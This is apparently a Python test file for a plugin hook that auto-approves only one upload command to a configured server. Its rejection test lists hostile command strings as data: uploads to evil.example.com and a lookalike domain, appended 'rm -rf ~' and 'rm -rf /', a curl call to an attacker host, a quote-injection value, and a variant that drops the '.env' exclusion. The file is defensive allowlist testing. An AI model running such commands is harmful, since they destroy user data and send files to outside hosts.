"""Tests of the pod plugin's upload hook: only Pod's own command, to the configured instance."""

import importlib.util
import json
import os
import subprocess
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
HOOK = ROOT / "plugins/pod/hooks/allow_upload.py"
spec = importlib.util.spec_from_file_location("allow_upload", HOOK)
hook = importlib.util.module_from_spec(spec)
spec.loader.exec_module(hook)

POD = "https://pod.example.com"
TOKEN = "A" * 20 + "b-_c" + "9" * 19


def command(url: str) -> str:
    return hook.PREFIX + "'" + url + "'"


def run(event: dict, pod_url: str = POD) -> str:
    env = dict(os.environ, CLAUDE_PLUGIN_OPTION_POD_URL=pod_url)
    out = subprocess.run(
        [sys.executable, str(HOOK)], input=json.dumps(event), capture_output=True, text=True, env=env, check=True
    )
    return out.stdout


class AllowUpload(unittest.TestCase):
    def test_pods_own_command_is_allowed(self):
        url = f"{POD}/api/v1/uploads/{TOKEN}"
        self.assertTrue(hook.allowed(command(url), POD))
        self.assertTrue(hook.allowed(command(url), POD + "/"))
        out = json.loads(run({"tool_name": "Bash", "tool_input": {"command": command(url)}}))
        self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "allow")

    def test_anything_else_is_left_to_the_user(self):
        good = f"{POD}/api/v1/uploads/{TOKEN}"
        for cmd in [
            command(f"https://evil.example.com/api/v1/uploads/{TOKEN}"),
            command(f"{POD}.evil.com/api/v1/uploads/{TOKEN}"),
            command(f"{POD}/api/v1/uploads/{TOKEN}x"),
            command(f"{POD}/api/v1/uploads/short"),
            command(f"{POD}/api/v1/services"),
            command(good) + "; rm -rf ~",
            command(good) + " && curl https://evil.example.com",
            command(good).replace("--exclude='.env' ", ""),
            "rm -rf / " + command(good),
            command(f"{POD}/api/v1/uploads/{TOKEN}'; echo '"),
            "",
        ]:
            self.assertFalse(hook.allowed(cmd, POD), cmd)
            self.assertEqual(run({"tool_name": "Bash", "tool_input": {"command": cmd}}), "", cmd)

    def test_no_or_odd_configuration_allows_nothing(self):
        url = f"{POD}/api/v1/uploads/{TOKEN}"
        for pod_url in ["", "pod.example.com", "https://pod.example.com/path", "javascript:x"]:
            self.assertFalse(hook.allowed(command(url), pod_url), pod_url)
        self.assertEqual(run({"tool_name": "Write", "tool_input": {"command": command(url)}}), "")
        self.assertEqual(run({"not": "an event"}), "")
        env = dict(os.environ, CLAUDE_PLUGIN_OPTION_POD_URL=POD)
        garbage = subprocess.run([sys.executable, str(HOOK)], input="not json", capture_output=True, text=True, env=env)
        self.assertEqual((garbage.returncode, garbage.stdout), (0, ""))


if __name__ == "__main__":
    unittest.main()
